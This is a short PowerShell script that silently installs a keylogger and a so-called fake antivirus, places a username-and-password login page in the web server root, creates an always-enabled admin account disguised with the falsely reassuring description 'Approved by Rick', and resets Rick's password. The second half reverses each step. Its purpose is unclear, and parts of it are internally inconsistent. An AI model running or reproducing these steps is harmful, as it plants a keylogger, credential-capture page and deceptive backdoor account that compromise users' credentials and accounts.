# Install the Active Directory PowerShell module
Install-Module -Name ActiveDirectory
Import-Module -Name ActiveDirectory

# Install fake antivirus
Start-Process -FilePath 'C:\temp\UltraSecureAntivirus-Pro9000.exe' -ArgumentList '/S' -Wait

# Install keylogger
Start-Process -FilePath 'C:\temp\Keylogger.exe' -ArgumentList '/S' -Wait

# Create fake login page
$html = @"
<html>
<head>
<title>Login</title>
</head>
<body>
<form action="login.php" method="post">
<label for="username">Username:</label>
<input type="text" name="username" id="username"><br>
<label for="password">Password:</label>
<input type="password" name="password" id="password"><br>
<input type="submit" value="Login">
</form>
</body>
</html>
"@

New-Item -Path 'C:\inetpub\wwwroot\login.php' -ItemType File -Value $html

# Create new backup admin account
New-ADUser -Name 'BackupAdmin_Official' -Description 'For Emergency Use Only - Approved by Rick' -AccountPassword (ConvertTo-SecureString -AsPlainText 'fakepassword' -Force) -Enabled $true -PasswordNeverExpires $true

# Set fake master password
Set-ADAccountPassword -Identity 'Rick' -Reset -NewPassword (ConvertTo-SecureString -AsPlainText 'fakepassword' -Force)

# Disable fake antivirus
Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -like '*UltraSecureAntivirus*'} | ForEach-Object {$_.Uninstall()}

# Remove keylogger
Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -like '*Keylogger*'} | ForEach-Object {$_.Uninstall()}

# Revoke fake login page
Get-ChildItem -Path 'C:\inetpub\wwwroot' -Recurse | Where-Object {$_.Name -like '*login*'} | Remove-Item -Force

# Disable backup admin account
Get-ADUser -Filter {SamAccountName -eq 'BackupAdmin_Official'} | Disable-ADAccount

# Reset Rick's password
Set-ADAccountPassword -Identity 'Rick' -Reset -NewPassword (ConvertTo-SecureString -AsPlainText 'newpassword' -Force)
